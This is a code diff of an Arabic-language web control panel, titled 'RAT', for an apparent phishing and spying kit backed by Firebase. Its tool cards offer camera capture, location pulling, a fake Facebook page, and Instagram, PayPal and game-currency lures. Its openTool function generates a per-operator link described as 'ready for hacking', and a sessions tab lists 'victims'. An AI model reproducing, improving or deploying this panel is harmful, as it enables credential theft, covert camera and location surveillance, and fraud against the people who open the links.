@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SPIDER RAT | NEURAL SYSTEM v5</title>
+    <title>RAT | Elcomando & Princess v¹</title>
     
     <script src="firebase-app.js"></script>
     <script src="firebase-database.js"></script>
@@ -15,13 +15,13 @@
         :root {
             --primary: #00f2ff;
             --bg: #050505;
-            --surface: rgba(15, 15, 15, 0.95);
-            --neon-glow: 0 0 15px rgba(0, 242, 255, 0.4);
+            --surface: rgba(15, 15, 15, 0.98);
+            --neon-glow: 0 0 15px rgba(0, 242, 255, 0.5);
         }
 
         body, html { margin: 0; padding: 0; background: var(--bg); color: white; font-family: 'Noto Kufi Arabic', sans-serif; overflow: hidden; height: 100vh; }
 
-        /* لودر الإيموجي */
+        /* لودر الإيموجي الاحترافي (3 ثواني) */
         #page-loader {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.95); z-index: 9999;
@@ -30,59 +30,77 @@
         .spinning-emoji { font-size: 70px; animation: rotate 1s infinite linear; filter: drop-shadow(0 0 15px var(--primary)); }
         @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
 
+        /* الديلوج النيون (الموحد) */
+        .custom-dialog-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85); backdrop-filter: blur(5px);
+            display: none; align-items: center; justify-content: center; z-index: 10000;
+        }
+        .custom-dialog-box {
+            width: 85%; max-width: 320px; background: #0a0a0a;
+            border: 2px solid var(--primary); border-radius: 20px;
+            padding: 25px; text-align: center; box-shadow: var(--neon-glow);
+            animation: zoomIn 0.3s ease;
+        }
+
         /* الهيدر */
-        .header { height: 65px; background: rgba(0,0,0,0.9); border-bottom: 2px solid var(--primary); display: flex; align-items: center; padding: 0 20px; position: fixed; top: 0; width: 100%; box-sizing: border-box; z-index: 1000; box-shadow: var(--neon-glow); }
-        .header h1 { font-family: 'Orbitron'; font-size: 16px; color: var(--primary); margin: 0; flex: 1; }
+        .header { height: 65px; background: rgba(0,0,0,0.9); border-bottom: 2px solid var(--primary); display: flex; align-items: center; padding: 0 20px; position: fixed; top: 0; width: 100%; box-sizing: border-box; z-index: 1000; }
+        .header h1 { font-family: 'Orbitron'; font-size: 16px; color: var(--primary); text-shadow: 0 0 10px var(--primary); margin: 0; flex: 1; }
 
         .viewport { margin-top: 75px; height: calc(100vh - 165px); overflow-y: auto; padding: 15px; }
         .page { display: none; }
         .page.active { display: block; animation: zoomIn 0.3s ease; }
-        @keyframes zoomIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+        @keyframes zoomIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
 
-        /* شبكة الـ 16 زرار */
-        .links-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
+        /* ستايل الكروت والروابط */
+        .links-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
         .tool-card { 
-            background: var(--surface); border: 1px solid #222; border-right: 4px solid var(--primary);
-            padding: 15px; border-radius: 15px; text-align: center; cursor: pointer; transition: 0.3s;
+            background: var(--surface); border: 1px solid #1a1a1a; border-right: 4px solid var(--primary);
+            padding: 15px; border-radius: 12px; text-align: center; cursor: pointer; transition: 0.3s;
         }
-        .tool-card:hover { border-color: var(--primary); transform: translateY(-3px); }
-        .tool-card i { font-size: 24px; color: var(--primary); margin-bottom: 8px; }
+        .tool-card:active { transform: scale(0.95); }
+        .tool-card i { font-size: 24px; color: var(--primary); margin-bottom: 5px; }
 
         /* الأزرار والمدخلات */
-        input { width: 100%; background: #000; border: 1px solid var(--primary); padding: 12px; border-radius: 10px; color: white; margin-bottom: 12px; text-align: center; box-sizing: border-box;}
-        .btn { width: 100%; background: var(--primary); color: #000; border: none; padding: 14px; border-radius: 10px; font-weight: 900; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        
-        /* الناف بار */
-        .bottom-nav { position: fixed; bottom: 0; width: 100%; height: 90px; background: #000; border-top: 2px solid var(--primary); display: flex; align-items: center; justify-content: space-around; z-index: 1000; }
-        .nav-item { color: #444; text-align: center; flex: 1; }
-        .nav-item.active { color: var(--primary); }
-        .nav-emoji { font-size: 18px; display: block; margin-bottom: 2px; }
-        .nav-item i { font-size: 18px; display: block; }
+        input { width: 100%; background: #000; border: 1px solid var(--primary); padding: 14px; border-radius: 10px; color: white; margin-bottom: 10px; text-align: center; box-sizing: border-box; outline: none; }
+        .btn { width: 100%; background: var(--primary); color: #000; border: none; padding: 14px; border-radius: 10px; font-weight: 900; cursor: pointer; transition: 0.3s; }
+        .btn:active { opacity: 0.7; }
 
-        /* حالة السيرفر */
-        #server-status { font-size: 12px; font-weight: bold; margin-top: 10px; }
-        .status-online { color: #00ff88; text-shadow: 0 0 5px #00ff88; }
+        /* الناف بار السفلي */
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; height: 90px; background: #000; border-top: 2px solid var(--primary); display: flex; align-items: center; justify-content: space-around; z-index: 1000; }
+        .nav-item { color: #444; text-align: center; flex: 1; transition: 0.3s; }
+        .nav-item.active { color: var(--primary); text-shadow: 0 0 10px var(--primary); }
+        .nav-emoji { font-size: 18px; display: block; }
     </style>
 </head>
 <body>
 
     <div id="page-loader">
         <div class="spinning-emoji" id="loader-icon">⚙️</div>
-        <p style="color:var(--primary); font-family:Orbitron; margin-top:15px; letter-spacing:2px;">CYBER CONNECTING...</p>
+        <p style="color:var(--primary); font-family:Orbitron; margin-top:15px;">SYNCHRONIZING...</p>
+    </div>
+
+    <div id="custom-alert" class="custom-dialog-overlay">
+        <div class="custom-dialog-box">
+            <div id="alert-icon" class="dialog-icon">⚠️</div>
+            <h3 id="alert-title" style="color: var(--primary); font-family: Orbitron;">TIPS</h3>
+            <p id="alert-msg" style="font-size: 14px; color: #ccc;"></p>
+            <button class="btn" onclick="closeAlert()">حسناً 👍</button>
+        </div>
     </div>
 
     <div id="auth-screen" style="height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px;">
         <div class="tool-card" style="width: 100%; max-width: 350px; border-right: none; border-top: 4px solid var(--primary);">
-            <img src="images/Elcomando.png" style="width: 60px; filter: drop-shadow(0 0 10px var(--primary)); margin-bottom: 10px;">
+            <img src="images/spider.png" style="width: 65px; filter: drop-shadow(0 0 10px var(--primary)); margin-bottom: 15px;">
             <div id="login-box">
-                <input type="text" id="loginKey" placeholder="أدخل مفتاح الدخول">
-                <button class="btn" onclick="handleAuth('login')">تسجيل الدخول 🔓</button>
-                <p onclick="toggleAuth(true)" style="font-size: 11px; margin-top: 15px; color: var(--primary);">ليس لديك مفتاح؟ إنشاء حساب</p>
+                <input type="text" id="loginKey" placeholder="أدخل مفتاح الـ PRO الخاص بك">
+                <button class="btn" onclick="handleAuth('login')">دخول السيرفر 🔓</button>
+                <p onclick="toggleAuth(true)" style="font-size: 11px; margin-top: 15px; color: var(--primary); cursor: pointer;">ليس لديك مفتاح؟ إنشاء حساب</p>
             </div>
             <div id="signup-box" style="display: none;">
-                <input type="text" id="userName" placeholder="اسمك المستعار">
-                <button class="btn" onclick="handleAuth('signup')">توليد مفتاح PRO 🛠️</button>
-                <p onclick="toggleAuth(false)" style="font-size: 11px; margin-top: 15px; color: var(--primary);">لديك حساب؟ سجل الآن</p>
+                <input type="text" id="userName" placeholder="اكتب اسمك المستعار">
+                <button class="btn" onclick="handleAuth('signup')">إنشاء حساب جديد 🛠️</button>
+                <p onclick="toggleAuth(false)" style="font-size: 11px; margin-top: 15px; color: var(--primary); cursor: pointer;">لديك حساب بالفعل؟ دخول</p>
             </div>
         </div>
     </div>
@@ -96,42 +114,52 @@
         <div class="viewport">
             <div id="tab1" class="page active">
                 <div class="links-grid">
-                    <div class="tool-card" onclick="openPage('camera')"><i class="fas fa-camera"></i><br><span>كاميرا 1</span></div>
-                    <div class="tool-card" onclick="openPage('location')"><i class="fas fa-map-marker-alt"></i><br><span>الموقع</span></div>
-                    <div class="tool-card" onclick="openPage('facebook')"><i class="fab fa-facebook"></i><br><span>فيسبوك</span></div>
-                    <div class="tool-card" onclick="openPage('insta')"><i class="fab fa-instagram"></i><br><span>إنستا</span></div>
-                    <div class="tool-card"><i class="fab fa-whatsapp"></i><br><span>واتساب</span></div>
-                    <div class="tool-card"><i class="fab fa-tiktok"></i><br><span>تيك توك</span></div>
-                    <div class="tool-card"><i class="fas fa-gamepad"></i><br><span>ببجي</span></div>
-                    <div class="tool-card"><i class="fas fa-gem"></i><br><span>فري فاير</span></div>
+                    <div class="tool-card" onclick="openTool('كاميرا الحماية 📸')"><i class="fas fa-camera"></i><br><span>كاميرا</span></div>
+                    <div class="tool-card" onclick="openTool('سحب الموقع 📍')"><i class="fas fa-map-marker-alt"></i><br><span>الموقع</span></div>
+                    <div class="tool-card" onclick="openTool('فيسبوك مزور 👤')"><i class="fab fa-facebook"></i><br><span>فيسبوك</span></div>
+                    <div class="tool-card" onclick="openTool('إنستجرام برو 📸')"><i class="fab fa-instagram"></i><br><span>إنستا</span></div>
+                    <div class="tool-card" onclick="openTool('واتساب ذهبي 💬')"><i class="fab fa-whatsapp"></i><br><span>واتساب</span></div>
+                    <div class="tool-card" onclick="openTool('تيك توك زيادة 🎵')"><i class="fab fa-tiktok"></i><br><span>تيك توك</span></div>
+                    <div class="tool-card" onclick="openTool('شدات ببجي 🎮')"><i class="fas fa-gamepad"></i><br><span>ببجي</span></div>
+                    <div class="tool-card" onclick="openTool('جواهر فري فاير 💎')"><i class="fas fa-gem"></i><br><span>فري فاير</span></div>
+                    <div class="tool-card" onclick="openTool('سناب شات 👻')"><i class="fab fa-snapchat"></i><br><span>سناب</span></div>
+                    <div class="tool-card" onclick="openTool('تلجرام بلس ✈️')"><i class="fab fa-telegram"></i><br><span>تلجرام</span></div>
+                    <div class="tool-card" onclick="openTool('نتفليكس مجاني 🎬')"><i class="fas fa-play"></i><br><span>نتفليكس</span></div>
+                    <div class="tool-card" onclick="openTool('باي بال فحص 💰')"><i class="fab fa-paypal"></i><br><span>باي بال</span></div>
+                    <div class="tool-card" onclick="openTool('واي فاي كاشف 📶')"><i class="fas fa-wifi"></i><br><span>واي فاي</span></div>
+                    <div class="tool-card" onclick="openTool('تويتر إكس 🐦')"><i class="fab fa-twitter"></i><br><span>X</span></div>
+                    <div class="tool-card" onclick="openTool('جوجل درايف 📁')"><i class="fab fa-google-drive"></i><br><span>درايف</span></div>
+                    <div class="tool-card" onclick="openTool('نظام الأمان 🛡️')"><i class="fas fa-user-shield"></i><br><span>الأمان</span></div>
                 </div>
             </div>
 
             <div id="tab2" class="page">
-                <div class="tool-card">
-                    <h3>نظام الربط بالسيرفر</h3>
-                    <div id="server-status">جاري فحص الاتصال... ⏳</div>
-                    <hr style="border: 0.5px solid #222; margin: 20px 0;">
-                    <button class="btn" style="background: transparent; border: 1px solid var(--primary); color: #fff;">فتح تطبيق Firebase</button>
+                <div class="tool-card" style="border-right:none; border-bottom: 3px solid var(--primary);">
+                    <h3 style="font-family: Orbitron;">SERVER SYNC</h3>
+                    <div id="server-status" style="margin: 20px 0; font-size: 14px; color: #ff1a1a;">جاري فحص الاتصال بالسيرفر... ⏳</div>
+                    <button class="btn" onclick="window.open('https://console.firebase.google.com/')">فتح تطبيق Firebase 🚀</button>
                 </div>
             </div>
 
             <div id="tab3" class="page">
-                <div id="sessions-list"></div>
+                <div id="sessions-container" style="text-align: center; color: #444; margin-top: 50px;">
+                    <i class="fas fa-spider fa-3x"></i>
+                    <p>لا يوجد ضحايا نشطين حالياً...</p>
+                </div>
             </div>
 
             <div id="tab4" class="page">
-                <div class="tool-card" style="text-align: right;">
-                    <div style="margin-bottom: 20px;">
-                        <span style="color: #666; font-size: 12px;">اسم المستخدم:</span>
-                        <h3 id="set-name" style="margin: 5px 0; color: var(--primary);">Comando</h3>
+                <div class="tool-card" style="text-align: right; border-right: 4px solid var(--primary);">
+                    <div style="margin-bottom: 25px;">
+                        <small style="color: #666;">اسم العميل:</small>
+                        <h2 id="set-username" style="margin: 0; color: var(--primary);">جاري التحميل...</h2>
                     </div>
-                    <div style="margin-bottom: 20px;">
-                        <span style="color: #666; font-size: 12px;">حالة النظام:</span>
-                        <h3 style="margin: 5px 0;">Premium PRO ✅</h3>
+                    <div style="margin-bottom: 25px;">
+                        <small style="color: #666;">حالة الاشتراك:</small>
+                        <h2 style="margin: 0;">Premium PRO ✅</h2>
                     </div>
-                    <button class="btn" onclick="alert('تم تحديث البيانات')">تحديث البيانات 🔄</button>
-                    <button class="btn" style="margin-top: 10px; background: #ff1a1a;" onclick="logout()">تسجيل الخروج 🚪</button>
+                    <button class="btn" style="margin-bottom: 12px;" onclick="showAlert('نجاح', 'تم تحديث جميع البيانات مع السيرفر ✅')">تحديث البيانات 🔄</button>
+                    <button class="btn" style="background: #ff1a1a;" onclick="logout()">تسجيل الخروج الآمن 🚪</button>
                 </div>
             </div>
         </div>
@@ -145,41 +173,61 @@
     </div>
 
     <script>
-        // إعدادات الداتا بيس الخاصة بك
+        // داتابيس الكوماندو الخاصة بك
         const firebaseConfig = { databaseURL: "https://elcomando-68116-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
+
+        // دوال التنبيه النيون
+        function showAlert(title, msg, icon = "⚠️") {
+            document.getElementById('alert-title').innerText = title;
+            document.getElementById('alert-msg').innerHTML = msg;
+            document.getElementById('alert-icon').innerText = icon;
+            document.getElementById('custom-alert').style.display = 'flex';
+        }
+        function closeAlert() { document.getElementById('custom-alert').style.display = 'none'; }
 
         function toggleAuth(isSignup) {
             document.getElementById('login-box').style.display = isSignup ? 'none' : 'block';
             document.getElementById('signup-box').style.display = isSignup ? 'block' : 'none';
         }
 
+        // تسجيل الدخول المصحح 100%
         async function handleAuth(type) {
+            const loader = document.getElementById('page-loader');
+            loader.style.display = 'flex';
+
             if(type === 'login') {
-                const key = document.getElementById('loginKey').value;
-                const snap = await db.ref('users/' + key).once('value');
-                if(snap.exists()) {
-                    localStorage.setItem('user_id', key);
-                    localStorage.setItem('user_name', snap.val().username);
-                    enterSystem();
-                } else { alert("المفتاح غير صحيح!"); }
+                const key = document.getElementById('loginKey').value.trim();
+                if(!key) { showAlert("تنبيه", "أدخل المفتاح أولاً!"); loader.style.display = 'none'; return; }
+
+                try {
+                    const snap = await db.ref('users/' + key).once('value');
+                    if(snap.exists()) {
+                        localStorage.setItem('user_id', key);
+                        localStorage.setItem('user_name', snap.val().username);
+                        enterSystem();
+                    } else { showAlert("خطأ", "المفتاح غير موجود بالسيرفر! ❌"); }
+                } catch(e) { showAlert("خطأ شبكة", "تأكد من إعدادات Rules في Firebase"); }
             } else {
-                const name = document.getElementById('userName').value;
-                const newKey = "CMD-" + Math.floor(Math.random()*90000);
+                const name = document.getElementById('userName').value.trim();
+                if(!name) { showAlert("تنبيه", "اكتب اسمك أولاً!"); loader.style.display = 'none'; return; }
+                const newKey = "CMD-" + Math.floor(1000 + Math.random() * 9000);
                 await db.ref('users/' + newKey).set({ username: name, plan: "PRO" });
-                alert("تم إنشاء حسابك! مفتاحك هو: " + newKey);
+                showAlert("مبارك! 🎉", `تم إنشاء حسابك.<br>مفتاحك هو: <b style="color:var(--primary)">${newKey}</b>`);
                 toggleAuth(false);
             }
+            loader.style.display = 'none';
         }
 
         function enterSystem() {
             document.getElementById('auth-screen').style.display = 'none';
             document.getElementById('main-panel').style.display = 'block';
-            document.getElementById('set-name').innerText = localStorage.getItem('user_name');
-            checkServer();
+            document.getElementById('set-username').innerText = localStorage.getItem('user_name');
+            checkServerStatus();
         }
 
+        // اللودر لمدة 3 ثواني عند التنقل
         function nav(id, title, emoji, el) {
             const loader = document.getElementById('page-loader');
             document.getElementById('loader-icon').innerText = emoji;
@@ -194,12 +242,17 @@
             }, 3000);
         }
 
-        function checkServer() {
-            const status = document.getElementById('server-status');
-            const uid = localStorage.getItem('user_id');
+        function openTool(toolName) {
+            const myID = localStorage.getItem('user_id');
+            const link = `https://elcomando-68116.web.app/login?id=${myID}`;
+            showAlert(toolName, `رابطك الجاهز للاختراق:<br><br><small style="color:var(--primary)">${link}</small><br><br><button class="btn" onclick="navigator.clipboard.writeText('${link}'); alert('تم النسخ ✅')">نسخ الرابط 📋</button>`, "🚀");
+        }
+
+        function checkServerStatus() {
+            const statusDiv = document.getElementById('server-status');
             db.ref('.info/connected').on('value', (snap) => {
                 if(snap.val() === true) {
-                    status.innerHTML = `<span class="status-online">تم الاتصال بالسيرفر بنجاح ✅<br>ID: ${uid}</span>`;
+                    statusDiv.innerHTML = `<span style="color:#00ff88; text-shadow:0 0 10px #00ff88;">تم الاتصال بالسيرفر بنجاح ✅<br>ID: ${localStorage.getItem('user_id')}</span>`;
                 }
             });
         }
